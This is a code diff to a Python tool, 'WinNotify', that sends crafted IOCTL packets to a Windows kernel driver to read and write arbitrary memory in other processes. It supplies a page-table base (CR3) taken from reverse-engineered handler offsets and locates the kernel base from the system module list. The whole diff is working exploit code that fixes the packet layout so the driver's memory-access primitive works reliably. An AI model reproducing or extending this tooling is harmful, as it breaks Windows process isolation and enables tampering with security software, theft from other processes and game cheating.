@@ -944,21 +944,28 @@ class WinNotify:
             layout = self.cfg.get("vioctl_layout", 0)
             field = lambda off: int.from_bytes(
                 payload[off:off + 8].ljust(8, b"\x00"), "little")
-            if layout == 0:            # [pid][va][buf][size][nonzero]
+            if layout == 0:            # [pid][va][buf][size][cr3]
                 pid, va, buf_ptr, size = field(0), field(8), field(0x10), field(0x18)
-                nonzero = field(0x20)
+                cr3 = field(0x20)
                 if not pid:
                     raise WinNotifyError(
                         f"0x{code:X}: +0x00 is the target PID and it is 0 -- "
                         "the driver answers 0xC0000022")
-                if not nonzero:
-                    raise WinNotifyError(
-                        f"0x{code:X}: +0x20 must be non-zero or the driver "
-                        "rejects the request before doing anything")
             elif layout == 1:          # [cr3][va][size][buf]
-                va, size, buf_ptr = field(8), field(0x10), field(0x18)
+                cr3, va, size, buf_ptr = field(0), field(8), field(0x10), field(0x18)
             else:                      # [pid][va][buf][size][cr3]
                 pid, va, buf_ptr, size = field(0), field(8), field(0x10), field(0x18)
+                cr3 = field(0x20)
+            # in[0x20] is the DirBase the handler walks (sub_2a24 passes it
+            # straight into the PML4 walk), so it must look like a page table
+            # and nothing else.  A constant here translates physical address 0
+            # and every request fails with STATUS_ACCESS_DENIED.
+            pfn = cr3 & self.cfg["cr3_mask"]
+            if not (0x1000 <= pfn < 0x000FFFFFFFFFF000) or pfn & 0xFFF:
+                raise WinNotifyError(
+                    f"0x{code:X}: DirBase 0x{cr3:X} is not a page-table base "
+                    "-- the driver walks the page tables with this value, so "
+                    "a bogus one dereferences physical address 0 -- refusing")
             if not self._is_user_ptr(buf_ptr):
                 raise WinNotifyError(
                     f"0x{code:X}: data buffer 0x{buf_ptr:X} is not a valid "
@@ -1303,65 +1310,67 @@ class WinNotify:
 
     # -- virtual R/W through a supplied DirBase (CR3) ----------------------
     def _vioclt_packet(self, pid, addr, buf_ptr, size, layout=None, st=None,
-                       scratch=None):
+                       cr3=None):
         """Build the 0x28-byte request for 0x222000 / 0x222004.
 
-        Straight from the driver:
-            in[0x00] = pid          (PsLookupProcessByProcessId; 0 -> 0xC0000022)
-            in[0x08] = process VA
-            in[0x10] = our buffer   (must be non-zero -- not validated)
-            in[0x18] = size         (must be non-zero)
-            in[0x20] = must be non-zero, otherwise the whole request is rejected
-                       with 0xC0000022 *before* anything else happens
+        Read straight off the handler (sub_2a24 / sub_2e3c):
 
-        The target CR3 is NOT taken from the request: the driver reads
-        EPROCESS+0x28 for `pid` itself.  Passing a CR3 in in[0x20] used to be
-        harmless-but-wrong; passing 0 made every call fail instantly.
+            in[0x00] = pid      PsLookupProcessByProcessId; 0 -> 0xC0000022
+            in[0x08] = va       must be non-zero
+            in[0x10] = buf      our buffer, must be non-zero
+            in[0x18] = size     must be non-zero
+            in[0x20] = *CR3*    must be non-zero
+
+        and then:
+
+            mov rdx, qword ptr [rdi + 0x20]   ; in[0x20] = the page table base
+            call 0x140002c10                  ; walk it: PML4 -> PDPT -> PD -> PT
+
+        So in[0x20] is not a "must be non-zero" flag -- it is the DirBase the
+        driver walks.  Feeding it a constant made every request translate
+        physical address 0 and fail with STATUS_ACCESS_DENIED.
         """
         st = st or self.cfg["vioctl_size"]
         if layout is None:
             layout = self.cfg.get("vioctl_layout", 0)
+        if cr3 is None:
+            cr3 = self.get_process_cr3(pid)
+        if not cr3:
+            raise WinNotifyError(
+                f"pid {pid}: no DirBase, and 0x222000/0x222004 walk the page "
+                "tables with in[0x20] -- refusing to send a request that "
+                "would translate physical address 0")
+        cr3 &= self.cfg["cr3_mask"]
         if layout == 0:
-            if self.cfg.get("vioctl_pid_field", True):
-                first = int(pid) & 0xFFFFFFFF
-            else:
-                first = 0
-            if self.cfg.get("vioctl_use_eprocess_cr3", True):
-                tail = 1 if scratch is None else scratch
-            else:
-                tail = 1 if scratch is None else scratch
-            packet = (
-                first.to_bytes(8, "little")
-                + (addr & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
-                + (buf_ptr & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
-                + (size & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
-                + (tail & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
-            )
-        elif layout == 1:
-            # legacy bridge variant: [cr3][va][size][buf]
-            cr3 = 0 if scratch is None else scratch
-            packet = (
-                (cr3 & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
-                + (addr & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
-                + (size & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
-                + (buf_ptr & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
-            )
-        else:
-            # layout 2: [pid][va][buf][size][cr3] -- the old "documented" shape
-            cr3 = 1 if scratch is None else scratch
             packet = (
                 (int(pid) & 0xFFFFFFFF).to_bytes(8, "little")
                 + (addr & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
                 + (buf_ptr & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
                 + (size & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
-                + (cr3 & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
+                + cr3.to_bytes(8, "little")
+            )
+        elif layout == 1:
+            # legacy bridge variant: [cr3][va][size][buf]
+            packet = (
+                cr3.to_bytes(8, "little")
+                + (addr & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
+                + (size & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
+                + (buf_ptr & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
+            )
+        else:
+            packet = (
+                (int(pid) & 0xFFFFFFFF).to_bytes(8, "little")
+                + (addr & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
+                + (buf_ptr & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
+                + (size & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
+                + cr3.to_bytes(8, "little")
             )
         return packet.ljust(st, b"\x00")[:st]
 
-    def _vread(self, pid, addr, buf_ptr, size):
+    def _vread(self, pid, addr, buf_ptr, size, cr3=None):
         """0x222000: copy `size` bytes from the process VA into our buffer."""
         st = self.cfg["vioctl_size"]
-        packet = self._vioclt_packet(pid, addr, buf_ptr, size, st=st)
+        packet = self._vioclt_packet(pid, addr, buf_ptr, size, st=st, cr3=cr3)
         try:
             self.ioctl(self.cfg["ioctl_vread"], packet, out_size=st, in_size=st)
         except WinNotifyIoctlError as exc:
@@ -1372,10 +1381,10 @@ class WinNotify:
                        self._vioclt_packet(pid, addr, buf_ptr, size), out_size=st,
                        in_size=self.cfg["vioctl_size"])
 
-    def _vwrite(self, pid, addr, buf_ptr, size):
-        """0x222004: 1 = copy our buffer into the process VA, 0 = the reverse."""
+    def _vwrite(self, pid, addr, buf_ptr, size, cr3=None):
+        """0x222004: copy our buffer into the process VA."""
         st = self.cfg["vioctl_size"]
-        packet = self._vioclt_packet(pid, addr, buf_ptr, size, st=st)
+        packet = self._vioclt_packet(pid, addr, buf_ptr, size, st=st, cr3=cr3)
         try:
             self.ioctl(self.cfg["ioctl_vwrite"], packet, out_size=st, in_size=st)
         except WinNotifyIoctlError as exc:
@@ -1388,7 +1397,7 @@ class WinNotify:
                 f"0x{self.cfg['ioctl_vwrite']:X} rejected the 0x{st:X}-byte "
                 f"request: {exc}") from exc
 
-    def _probe_vioctl(self, pid, addr, buf_ptr, size, write):
+    def _probe_vioctl(self, pid, addr, buf_ptr, size, write, cr3=None):
         """Only used when the length check rejects the verified layout.
 
         Documents that the driver answered 0xC0000004; the only alternative
@@ -1398,7 +1407,8 @@ class WinNotify:
         for st in self.cfg.get("vioctl_probe_sizes", [0x28, 0x20]):
             if st == 0x28:
                 continue
-            packet = self._vioclt_packet(pid, addr, buf_ptr, size, layout=1, st=st)
+            packet = self._vioclt_packet(pid, addr, buf_ptr, size, layout=1, st=st,
+                                         cr3=cr3)
             try:
                 self.ioctl(code, packet, out_size=st, in_size=st)
             except WinNotifyError:
@@ -1806,11 +1816,13 @@ class WinNotify:
             return b""
         addr &= 0xFFFFFFFFFFFFFFFF
         self._guard_user_va(addr, size)
+        # 0x222000 walks the page tables with the DirBase in in[0x20], so we
+        # need it on every path, not just the 0x222040 fallback.
+        cr3 = self.get_process_cr3(pid)
+        if not cr3:
+            raise WinNotifyError(
+                f"pid {pid}: CR3 not found (unknown process or offset mismatch)")
         if not self.cfg.get("use_direct_vioctl", True):
-            cr3 = self.get_process_cr3(pid)
-            if not cr3:
-                raise WinNotifyError(
-                    f"pid {pid}: CR3 not found (unknown process or offset mismatch)")
             return self._read_memory_via_kernel(cr3, addr, size)
 
         buf = ctypes.create_string_buffer(size)
@@ -1823,7 +1835,7 @@ class WinNotify:
             off = cur & (page - 1)
             take = min(page - off, size - done, step)
             try:
-                self._vread(pid, cur, ptr + done, take)      # per-page: safe
+                self._vread(pid, cur, ptr + done, take, cr3=cr3)   # per-page: safe
             except WinNotifyError as exc:
                 raise WinNotifyError(
                     f"page-table read failed at 0x{cur:X} "
@@ -1874,11 +1886,11 @@ class WinNotify:
             return
         addr &= 0xFFFFFFFFFFFFFFFF
         self._guard_user_va(addr, len(data))
+        cr3 = self.get_process_cr3(pid)
+        if not cr3:
+            raise WinNotifyError(
+                f"pid {pid}: CR3 not found (unknown process or offset mismatch)")
         if not self.cfg.get("use_direct_vioctl", True):
-            cr3 = self.get_process_cr3(pid)
-            if not cr3:
-                raise WinNotifyError(
-                    f"pid {pid}: CR3 not found (unknown process or offset mismatch)")
             self._write_memory_via_kernel(cr3, addr, data)
             return
 
@@ -1890,7 +1902,7 @@ class WinNotify:
             cur = addr + done
             off = cur & (page - 1)
             take = min(page - off, len(data) - done)
-            self._vwrite(pid, cur, ptr + done, take)
+            self._vwrite(pid, cur, ptr + done, take, cr3=cr3)
             done += take
 
     def _write_memory_via_kernel(self, cr3, addr, data):
@@ -2110,10 +2122,11 @@ def _system_module_information():
             raw[MODULE_INFO_NAME_OFFSET:MODULE_INFO_NAME_OFFSET + 2], "little")
         if not 0 < name_off < 0x100:
             name_off = 0
-        image_size = int.from_bytes(raw[0x18:0x20], "little")
+        image_size = int.from_bytes(raw[0x18:0x1C], "little")   # DWORD
+        flags = int.from_bytes(raw[0x1C:0x20], "little")
         path = raw[MODULE_INFO_NAME + name_off:
                    MODULE_INFO_NAME + 0x100].split(b"\x00", 1)[0]
-        modules.append((path.decode("latin-1"), image_base, image_size))
+        modules.append((path.decode("latin-1"), image_base, image_size, flags))
     if not modules:
         raise WinNotifyError("module list came back empty")
     return modules
@@ -2138,23 +2151,23 @@ def kernel_base_from_system_info(name="ntoskrnl.exe"):
         wanted += ".exe"
     modules = _system_module_information()
     entry = None
-    for path, base, image_size in modules:
+    for path, base, image_size, flags in modules:
         bare = path.replace("/", "\\").lower()
         if bare.endswith("\\" + wanted):
-            entry = (path, base, image_size)
+            entry = (path, base, image_size, flags)
             break
     if entry is None:
-        for path, base, image_size in modules:
+        for path, base, image_size, flags in modules:
             if wanted[:-4] in path.lower():
-                entry = (path, base, image_size)
+                entry = (path, base, image_size, flags)
                 break
     if entry is None:
         sample = ", ".join(p.replace("/", "\\").split("\\")[-1]
-                           for p, _, _ in modules[:6])
+                           for p, _, _, _ in modules[:6])
         raise WinNotifyError(
             f"{name} is not in the {len(modules)}-entry module list "
             f"(first entries: {sample})")
-    path, base, image_size = entry
+    path, base, image_size, flags = entry
     if (base >> 48) != 0xFFFF or base < 0xFFFF800000000000:
         raise WinNotifyError(
             f"module list gave 0x{base:X} for {name}, which is not a kernel "
@@ -2167,6 +2180,11 @@ def kernel_base_from_system_info(name="ntoskrnl.exe"):
         raise WinNotifyError(
             f"module list gave ImageSize 0x{image_size:X} for {name} -- "
             "layout mismatch")
+    # NOTE: `flags` is deliberately NOT enforced.  The driver only ever reads
+    # OffsetToFileName (+0x26) and ImageBase (+0x10) out of this struct, so
+    # the meaning of the Flags dword is not something the binary can confirm
+    # -- and an unverifiable check is how the 2 MB alignment rule got this
+    # wrong in the first place.
     return base
 
 
